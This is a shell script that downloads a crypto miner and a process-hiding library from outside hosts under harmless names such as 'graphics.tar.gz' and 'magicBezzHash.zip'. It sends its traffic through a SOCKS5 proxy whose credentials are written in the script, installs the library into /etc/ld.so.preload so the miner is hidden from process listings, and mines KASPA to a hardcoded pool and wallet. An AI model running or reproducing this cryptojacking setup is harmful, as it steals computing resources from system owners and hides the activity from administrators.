#!/bin/sh

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 193.202.14.34:1080

socks5_username = mix10154ND6ZH

socks5_password = eKrFCOvx

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "

./graftcp/graftcp wget https://github.com/angkii/m/blob/main/lolMiner

chmod +x lolMiner

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip

unzip magicBezzHash.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lolMiner --algo KASPA --pool 159.223.188.176:80 --user kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.v100 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
